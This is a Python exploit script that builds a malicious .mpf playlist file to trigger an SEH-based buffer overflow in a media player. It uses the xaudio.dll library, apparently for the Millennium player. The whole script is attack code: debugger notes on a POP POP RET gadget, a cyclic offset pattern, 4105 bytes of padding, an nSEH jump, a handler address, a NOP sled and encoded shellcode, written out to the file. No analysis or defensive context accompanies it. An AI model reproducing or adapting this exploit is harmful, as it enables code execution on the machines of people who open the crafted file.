
#   0BADF00D    xaudio.dll
#   10012CB6   5D               POP EBP
#   10012CB7   5B               POP EBX
#   10012CB8   C3               RETN

#   0012F918   53774358  XCwS  Pointer to next SEH record   4105
#   0012F91C   4B477741  AwGK  SE handler

pattern = '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'

junk = 'http:AA'
junk += 'A'*4105



nseh = '\xeb\x28\x90\x90'
#   10012CB6
seh_handler  = '\xB6\x2C\x01\x10'
shellcode = '\x90'*50
shellcode +=("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")
junk2 = 'D'*(5005-(len(junk)+len(nseh)+len(seh_handler)+len(shellcode)))



payload = junk + nseh + seh_handler + shellcode + junk2
payload = payload.encode('raw_unicode_escape')


f = open('./milennium_seh.mpf','wb')
f.write(payload)

print("payload created successfully")

f.close()


